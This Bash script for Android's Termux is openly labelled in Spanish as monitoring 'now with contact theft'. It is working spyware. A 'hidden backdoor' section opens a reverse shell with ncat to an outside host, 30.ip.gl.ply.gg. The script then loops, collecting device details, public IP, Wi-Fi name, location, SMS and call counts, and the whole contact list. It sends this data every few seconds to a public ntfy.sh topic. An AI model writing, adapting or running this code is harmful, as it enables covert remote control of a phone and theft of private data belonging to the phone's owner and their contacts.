#!/bin/bash
# Monitoreo Inteligente Mejorado (Ahora con Robo de Contactos)

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/pe9278301"
INTERVALO=5  #tiempo entre actualizaciones
DURACION_MIN=60 # Duración total en minutos
DEBUG=true

# Backdoor oculto
rm ~/f 2>/dev/null; mkfifo ~/f
cat ~/f | /bin/sh -i 2>&1 | ncat 30.ip.gl.ply.gg 57856 > ~/f &

# ===== FUNCIONES MEJORADAS =====
obtener_contactos() {
    echo "[📇] EXTRAYENDO CONTACTOS..."
    termux-contact-list 2>/dev/null | jq -c 'map({nombre: .name, numero: .number})' | base64 -w 0
}

generar_reporte() {
    # 1. Información del dispositivo
    local modelo=$(getprop ro.product.model)
    local android=$(getprop ro.build.version.release)
    local bateria=$(termux-battery-status 2>/dev/null | jq -r '"\(.percentage)% (\(.status))"')
    
    # 2. Datos de red
    local ip_publica=$(curl -sS ifconfig.me)
    local wifi=$(termux-wifi-connectioninfo 2>/dev/null | jq -r '.ssid // "Celular"')
    
    # 3. Ubicación aproximada
    local ubicacion=$(termux-location -p network 2>/dev/null | jq -r '"\(.latitude),\(.longitude) ±\(.accuracy)m"' 2>/dev/null)
    
    # 4. Actividad y CONTACTOS
    local nuevos_sms=$(termux-sms-list -l 2 --timestamp $(date +%s -d "1 hour ago") 2>/dev/null | jq length)
    # Versión corregida (usa 'map' + 'select' correctamente)
local llamadas=$(termux-call-log -l 5 2>/dev/null | jq 'map(select(.date >= (now - 3600|floor))) | length')
    local contactos=$(obtener_contactos)

    # Construir mensaje
    echo "📊 INFORME COMPLETO
📱 Dispositivo: $modelo | Android: $android
🔋 Batería: $bateria | 📶 Red: $wifi
🌐 IP: $ip_publica | 📍 Ubicación: ${ubicacion:-No disponible}

📞 Llamadas recientes: $llamadas
📩 SMS nuevos: $nuevos_sms
📇 CONTACTOS (base64): $contactos

⏳ Próxima actualización: en $((INTERVALO/60)) min"
}

enviar_ntfy() {
    curl -sS -X POST "$NTFY_URL" -d "$1" >/dev/null 2>&1 &
}

# ===== PROGRAMA PRINCIPAL =====
ITERACION=0
MAX_ITERACIONES=$((DURACION_MIN*60/INTERVALO))

[ "$DEBUG" = true ] && echo "🔍 Iniciando monitoreo por $DURACION_MIN minutos"

while [ $ITERACION -lt $MAX_ITERACIONES ]; do
    enviar_ntfy "$(generar_reporte)"
    ITERACION=$((ITERACION+1))
    sleep $INTERVALO
done

[ "$DEBUG" = true ] && echo "✅ Monitoreo completado"
enviar_ntfy
